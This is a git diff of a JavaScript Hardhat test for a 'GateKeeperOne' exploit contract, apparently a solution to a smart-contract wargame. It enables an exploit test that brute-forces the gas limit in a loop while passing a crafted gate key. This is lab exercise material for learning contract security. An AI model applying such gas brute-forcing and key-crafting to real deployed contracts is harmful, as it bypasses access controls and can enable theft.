@@ -18,25 +18,33 @@ describe("Exploit GateKeeperOne", function() {
         return {gateKeeper, gatekeeperExploiter}
     }
 
-    it("Should have the address of the owner set to the creator", async () => {
+    xit("Should have the address of the owner set to the creator", async () => {
         const {gateKeeper, gatekeeperExploiter} = await loadFixture(deployGateKeeper);
         const [owner] = await hre.ethers.getSigners();
         expect(await gatekeeperExploiter.ownerAddress()).to.equal(owner.address)
     })
 
-    it("Should have set the victim address to the exploit contract", async () => {
+    xit("Should have set the victim address to the exploit contract", async () => {
         const {gateKeeper, gatekeeperExploiter} = await loadFixture(deployGateKeeper);
         const gateKeeperAddress = gateKeeper.address;
         const victimAddress = await gatekeeperExploiter.victim();
         expect(victimAddress).to.equal(gateKeeperAddress);
     })
-
     
-    
-    xit("Should be able to exploit the gateKeeperOne contract", async () => {
+    it("Should be able to exploit the gateKeeperOne contract", async () => {
         const {gateKeeper, gatekeeperExploiter} = await loadFixture(deployGateKeeper);
 
-        const isEntered = await gatekeeperExploiter.functions.exploit("0x0000000000000000", {gasLimit: 3000000});
+        let gasCost = 2997288;
+        while(true){
+            try{
+                // const isEntered = await gatekeeperExploiter.functions.exploit("0x1000000000002daa", {gasLimit: gasCost});
+                const isEntered = await gatekeeperExploiter.functions.exploit("0x1000000000002266", {gasLimit: gasCost});
+                break;
+            }catch{
+                gasCost -= 1;
+                console.log(gasCost);
+            }
+        }
         // expect(isEntered).to.equal(true);
     })
 })
